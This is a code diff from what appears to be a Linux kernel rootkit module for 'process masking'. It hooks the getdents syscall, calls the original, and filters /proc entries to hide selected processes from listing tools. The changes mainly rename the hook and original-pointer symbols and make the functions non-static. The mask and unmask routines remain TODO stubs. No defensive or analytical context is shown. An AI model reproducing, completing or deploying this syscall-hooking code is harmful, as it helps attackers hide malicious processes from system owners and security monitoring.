@@ -52,19 +52,19 @@ struct linux_dirent {
 /* Definition of global variables */
 static int show_debug_messages;
 static unsigned long proc_ino;
-asmlinkage int (*getdents_syscall)(unsigned int, struct linux_dirent *, unsigned int);   //TODO: should point to original_getdents
+asmlinkage int (*pm_original_getdents_syscall)(unsigned int, struct linux_dirent *, unsigned int);   //TODO: should point to original_getdents
 static int pids[PIDS_BUFFSIZE];   //TODO: to be deleted
 static int pids_count;   //TODO: to be deleted
 
 
 /* Declaration of functions */
-static int process_masking_init(int);
-static int process_masking_exit(void);
+int process_masking_init(int);
+int process_masking_exit(void);
 
-asmlinkage int my_getdents_syscall(unsigned int, struct linux_dirent *, unsigned int);
+asmlinkage int process_masking_getdents_syscall(unsigned int, struct linux_dirent *, unsigned int);
 
-static void mask_process(pid_t);
-static void unmask_process(pid_t);
+void mask_process(pid_t);
+void unmask_process(pid_t);
 
 static unsigned long get_inode_no(char *);
 static int should_mask(pid_t);
@@ -78,7 +78,7 @@ static int should_mask(pid_t);
 
 
 /* Initialization function */
-static int process_masking_init(int debug_mode_on)
+int process_masking_init(int debug_mode_on)
 {
 	show_debug_messages = debug_mode_on;
 
@@ -92,7 +92,7 @@ static int process_masking_init(int debug_mode_on)
 }
 
 
-static int process_masking_exit(void)
+int process_masking_exit(void)
 {
 	DEBUG_PRINT("exited");
 
@@ -102,7 +102,7 @@ static int process_masking_exit(void)
 
 /* Function that replaces the original getdents syscall. In addition to what
    getdents does, additionally it ...  */
-asmlinkage int my_getdents_syscall(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
+asmlinkage int process_masking_getdents_syscall(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
 {
 	int nread;
 	int nread_temp;
@@ -110,7 +110,7 @@ asmlinkage int my_getdents_syscall(unsigned int fd, struct linux_dirent *dirp, u
 	char *endptr;
 
 	/* Call original getdents_syscall */
-	nread = getdents_syscall(fd, dirp, count);
+	nread = pm_original_getdents_syscall(fd, dirp, count);
 
 	if (dirp->d_ino != proc_ino)
 		return nread;
@@ -138,13 +138,13 @@ asmlinkage int my_getdents_syscall(unsigned int fd, struct linux_dirent *dirp, u
 }
 
 
-static void mask_process(pid_t pid)
+void mask_process(pid_t pid)
 {
 	//TODO: to be implemented
 }
 
 
-static void unmask_process(pid_t pid)
+void unmask_process(pid_t pid)
 {
 	//TODO: to be implemented
 }
